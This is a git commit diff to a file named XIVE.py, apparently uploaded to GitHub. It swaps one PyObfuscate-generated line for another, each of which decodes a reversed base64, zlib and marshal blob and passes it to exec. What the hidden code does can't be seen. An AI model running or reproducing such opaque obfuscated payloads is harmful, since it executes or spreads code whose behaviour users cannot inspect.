c11dad2f0796c35de1aa38ef4bfd53fa692bbd09
xive7 <mdahnaf094@gmail.com>
2025-12-07 16:25:16 +0600

    Add files via upload

--- XIVE.py
+++ XIVE.py
@@ -1,5 +1,5 @@
 # Obfuscated with PyObfuscate
 # https://www.github.com/htr-tech
-# Time : Sat Nov 29 23:01:28 2025
+# Time : Sun Dec  7 16:23:47 2025
 # -------------------------------
-_ = lambda __ : __import__('marshal').loads(__import__('zlib').decompress(__import__('base64').b64decode(__[::-1])));exec((_)(b'1IS47AQBo0AiqGUlxBCy4C5ZcNfNwJjbkkxdMyIjM/QiBsIFwEjZAjjitL1cKN18yxGO3aXF2w8XiD5ZDXif+Uiw08S1X/NIu1SxkhQuxsIfJfa5gcFMPjA+4jvrtMuJmCylm3kJKZoR5ADAAXmYOXZDcVmSUiAyFjxyQOMmCDpwQ6MmQWxs6DFTCAkZLxJe'))
+_ = lambda __ : __import__('marshal').loads(__import__('zlib').decompress(__import__('base64').b64decode(__[::-1])));exec((_)(b'=InIWzFAUAqNikuBVR+giIfQdOHzVDcy4CZZeLjMzAjPkYALQBsxbAg4rUbSNnyTNnMsi3N2UtdM/paQfyQl4j/nXBz/gAIgHjH+e2SxkhQuxsIfJfa5gcFMPjA+4jvrtMuJmCylm3kJKZoR5ADAAXmYOXZDcVmSUiAyFjxyQOMmCDpwQ6MmQWxs6DFTCAkZLxJe'))
